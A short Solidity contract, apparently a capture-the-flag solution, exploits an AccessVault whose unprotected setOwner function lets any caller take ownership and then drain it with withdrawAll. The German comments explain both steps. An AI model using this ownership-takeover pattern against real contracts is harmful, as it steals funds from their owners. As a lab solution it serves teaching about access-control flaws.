// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "./Challenge.sol";

contract Solution {
    function solve(Setup setup) external {
        AccessVault vault = setup.vault();

        // Owner übernehmen: Owner muss der Contract sein, der später withdrawAll() aufruft
        vault.setOwner(address(this));

        // Jetzt darf dieser Contract abheben und an den Player weiterleiten
        vault.withdrawAll(payable(msg.sender));
    }
}